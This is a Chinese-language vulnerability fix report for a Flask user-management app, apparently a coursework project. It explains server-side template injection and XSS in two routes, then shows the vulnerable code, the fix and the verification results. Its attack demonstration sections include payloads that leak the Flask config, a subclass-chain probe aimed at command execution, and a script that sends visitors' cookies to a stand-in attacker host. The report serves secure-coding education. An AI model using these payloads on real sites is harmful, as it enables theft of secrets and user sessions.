# 🛡️ 漏洞修复报告（第四批）

> **项目**: Flask 用户信息管理平台
> **路径**: `/opt/Class01/`
> **GitHub**: https://github.com/kittyoo0805/-2026

---

## 修复的漏洞：SSTI + XSS（共 4 处）

| # | 漏洞类型 | 漏洞名称 | 严重程度 | 位置 |
|:-|---------|---------|:--------:|:----:|
| ① | 🟣 **SSTI** | 欢迎页模板注入 | 🔴 **严重** | `GET /welcome?name=` |
| ② | 🟣 **SSTI** | 反馈页模板注入 | 🔴 **严重** | `POST /feedback` |
| ③ | 🟡 **XSS** | 欢迎页跨站脚本 | 🟠 **高危** | `GET /welcome?name=` |
| ④ | 🟡 **XSS** | 反馈页跨站脚本 | 🟠 **高危** | `POST /feedback` |

---

## 什么是 SSTI？

**SSTI（Server-Side Template Injection，服务端模板注入）** 是一种 Web 安全漏洞，攻击者通过向模板中注入恶意模板语法（如 `{{}}`），使服务端在渲染模板时执行了攻击者控制的代码。

### SSTI 与 SQL 注入的对比

| 对比项 | SQL 注入 | SSTI（模板注入） |
|:------|---------|-----------------|
| **注入目标** | SQL 语句 | Jinja2 模板引擎 |
| **注入符号** | `'` 单引号闭合 | `{{ }}` 模板表达式 |
| **典型 Payload** | `' OR '1'='1` | `{{7*7}}`、`{{config}}` |
| **危害** | 窃取数据库 | 执行任意 Python 代码 |

---

## 漏洞①：欢迎页 SSTI + XSS

| 项目 | 内容 |
|:----|------|
| **路由** | `GET /welcome?name=张三` |
| **行号** | 第 636 行 |
| **渲染方式** | `render_template_string()` + f-string 拼接 |

### 漏洞代码（修复前）

```python
@app.route("/welcome")
def welcome():
    name = request.args.get("name", "")
    # ❌ name 通过 f-string 直接拼入模板字符串
    html = f"<h1>欢迎你，{name}！</h1>"
    return render_template_string(html)
```

### 漏洞原理

`render_template_string()` 是 Flask 的模板渲染函数，它会解析字符串中的 Jinja2 模板语法。当 `name` 通过 f-string `{name}` 拼入时：

- 用户输入 `张三` → 渲染结果：`<h1>欢迎你，张三！</h1>` ✅ 正常
- 用户输入 `{{7*7}}` → 渲染结果：`<h1>欢迎你，49！</h1>` ❌ SSTI 注入成功！
- 用户输入 `<script>alert('XSS')</script>` → 浏览器执行 JS ❌ XSS 成功！

### 攻击演示

```bash
# SSTI：利用 Jinja2 模板语法执行表达式
curl "http://target:5000/welcome?name={{7*7}}"
# 输出：<h1>欢迎你，49！</h1>  ← 7*7 被执行

# SSTI：读取 Flask 配置（含 SECRET_KEY）
curl "http://target:5000/welcome?name={{config}}"
# 输出：<Config {'ENV': 'production', 'SECRET_KEY': '...'}>

# SSTI：调用 Python 对象执行系统命令（高级利用）
curl "http://target:5000/welcome?name={{''.__class__.__mro__[2].__subclasses__()}}"
# 可获取所有子类，找到 os 模块执行命令

# XSS：注入恶意脚本
curl "http://target:5000/welcome?name=<script>document.location='http://hacker.com/?c='+document.cookie</script>"
# 访问者 Cookie 被发送到黑客服务器
```

### 修复方式

**修复前**（f-string 拼接，SSTI 和 XSS 均可利用）：
```python
html = f"<h1>欢迎你，{name}！</h1>"
return render_template_string(html)
```

**修复后**（Jinja2 变量传递，SSTI 失效，XSS 自动转义）：
```python
html = "<h1>欢迎你，{{ name }}！</h1>"
return render_template_string(html, name=name)
```

### 修复原理

| 对比项 | 修复前（f-string） | 修复后（模板变量） |
|:------|-----------------|-----------------|
| 代码 | `f"...{name}..."` | `"...{{ name }}..."`, `name=name` |
| 用户输入 `{{7*7}}` | 先 f-string 展开 → `"<h1>...{{7*7}}...</h1>"` → Jinja2 渲染 → **执行 `7*7`** | Jinja2 收到变量 `name="{{7*7}}"` → 纯文本输出 → **不执行** |
| 用户输入 `<script>` | 直接输出到 HTML，浏览器执行 | Jinja2 自动转义为 `&lt;script&gt;`，浏览器不执行 |

**核心区别**：
- **f-string 拼接**：用户在 Python 层面就已经注入了 `{{}}` 语法，Jinja2 渲染时无法区分
- **模板变量**：用户数据作为纯文本传给 Jinja2，Jinja2 自动转义 HTML 特殊字符，`{{}}` 只是普通文本

---

## 漏洞②：反馈页 SSTI + XSS

| 项目 | 内容 |
|:----|------|
| **路由** | `POST /feedback` |
| **行号** | 第 676-677 行 |
| **漏洞变量** | `name` 和 `message` 两个参数 |

### 漏洞代码（修复前）

```python
@app.route("/feedback", methods=["POST"])
def feedback():
    name = request.form.get("name", "")
    message = request.form.get("message", "")
    # ❌ 两个参数都通过 f-string 拼入模板
    html = f"<h2>{name} 的反馈：</h2><p>{message}</p>"
    return render_template_string(html)
```

### 攻击演示

```bash
# SSTI：注入模板语法
curl -X POST "http://target:5000/feedback" \
  -d "name={{config}}" -d "message={{7*7}}"
# 输出：SECRET_KEY 泄露 + 49

# XSS：注入恶意脚本
curl -X POST "http://target:5000/feedback" \
  -d "name=<img src=x onerror=alert(1)>" -d "message=test"
# 页面弹出 1
```

### 修复方式

```python
# 修复前（f-string 拼接）
html = f"<h2>{name} 的反馈：</h2><p>{message}</p>"
return render_template_string(html)

# 修复后（Jinja2 变量传递）
html = "<h2>{{ name }} 的反馈：</h2><p>{{ message }}</p>"
return render_template_string(html, name=name, message=message)
```

---

## 修复效果对比

### SSTI 防御验证

```bash
# 修复前
curl "/welcome?name={{7*7}}"
# → <h1>欢迎你，49！</h1>  ← 执行了模板代码

# 修复后
curl "/welcome?name={{7*7}}"
# → <h1>欢迎你，{{7*7}}！</h1>  ← 纯文本输出
```

### XSS 防御验证

```bash
# 修复前
curl "/welcome?name=<script>alert(1)</script>"
# → 浏览器弹出对话框

# 修复后
curl "/welcome?name=<script>alert(1)</script>"
# → <h1>欢迎你，&lt;script&gt;alert(1)&lt;/script&gt;！</h1>
# → 浏览器不执行，显示为文本
```

### 正常功能不受影响

```bash
# 修复后正常功能
curl "/welcome?name=张三"
# → <h1>欢迎你，张三！</h1>  ✅

curl -X POST /feedback -d "name=李四" -d "message=很好"
# → <h2>李四 的反馈：</h2><p>很好</p>  ✅
```

---

## 验证结果汇总

| 测试项 | 漏洞类型 | 修复前 | 修复后 |
|:------|---------|:------:|:------:|
| `{{7*7}}` 欢迎页 | SSTI | ✅ 输出 `49` | ❌ 输出 `{{7*7}}` |
| `{{config}}` 反馈页 | SSTI | ✅ 泄露配置 | ❌ 输出 `{{config}}` |
| `<script>` 欢迎页 | XSS | ✅ 执行脚本 | ❌ 转义为 `&lt;script&gt;` |
| `<script>` 反馈页 | XSS | ✅ 执行脚本 | ❌ 转义为 `&lt;script&gt;` |
| 正常中文姓名 | 正常功能 | ✅ | ✅ |
| 正常反馈留言 | 正常功能 | ✅ | ✅ |
| 帮助中心页面 | 正常功能 | ✅ | ✅ |

---

## 修改的文件

| 文件 | 修改内容 |
|:----|---------|
| `app.py`（第 636 行） | `/welcome`：f-string 拼接 → Jinja2 变量 `{{ name }}` |
| `app.py`（第 676-677 行） | `/feedback`：f-string 拼接 → Jinja2 变量 `{{ name }}` 和 `{{ message }}` |

## 防止 SSTI 的最佳实践

1. **永远不要用 f-string 拼接用户输入到模板中**
   ```python
   # ❌ 错误
   render_template_string(f"<h1>{user_input}</h1>")
   
   # ✅ 正确
   render_template_string("<h1>{{ user_input }}</h1>", user_input=user_input)
   ```

2. **尽可能使用 `render_template()` 而不是 `render_template_string()`**
   - `render_template()` 读取文件模板，天然隔离用户输入

3. **最小化 `| safe` 的使用**
   - 只有确认内容安全时才使用 `| safe` 过滤器

4. **输入验证**
   - 对用户输入做长度、格式等校验（但不能替代参数化传递）
